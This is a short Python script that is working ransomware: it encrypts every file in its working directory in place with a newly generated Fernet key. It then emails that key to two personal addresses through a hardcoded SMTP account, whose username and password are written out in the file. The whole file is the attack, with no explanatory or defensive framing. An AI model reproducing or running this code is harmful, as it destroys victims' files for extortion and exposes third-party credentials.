import smtplib
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "my_file.py" or file == "thekey.key" or file == "decrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
key = key.decode('utf-8')

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)

    with open (file, "wb") as thefile:
        thefile.write(contents_encrypted)

gmail_user = 'info@sportcentre.info'
gmail_password = '(df1v3L^}12n'

sent_from = gmail_user
to = ['lilko.petkovv@gmail.com', 'lilkoo.petkovv@gmail.com']
subject = f'Ransomware key'
body = key

email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(to), subject, body)

try:
    smtp_server = smtplib.SMTP_SSL('mail.sportcentre.info', 465)
    smtp_server.ehlo()
    smtp_server.login(gmail_user, gmail_password)
    smtp_server.sendmail(sent_from, to, email_text)
    smtp_server.close()
    print ("Email sent successfully!")
except Exception as ex:
    print ("Something went wrong….",ex)
